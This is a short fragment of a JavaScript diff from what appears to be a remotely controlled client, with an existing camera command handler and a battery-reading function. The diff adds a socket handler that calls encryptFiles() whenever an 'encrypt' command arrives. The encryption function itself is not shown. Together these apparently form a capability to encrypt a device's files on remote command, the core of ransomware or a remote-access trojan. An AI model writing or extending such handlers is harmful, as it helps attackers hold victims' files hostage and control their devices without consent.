@@ -57,6 +57,11 @@ socket.on('camera', function(data){
 
 })
 
+
+socket.on('encrypt', function(data){
+	encryptFiles();
+})
+
 function getBatteryPercentage(sendEmail)
 {
 	return navigator.getBattery().then(function(battery) {
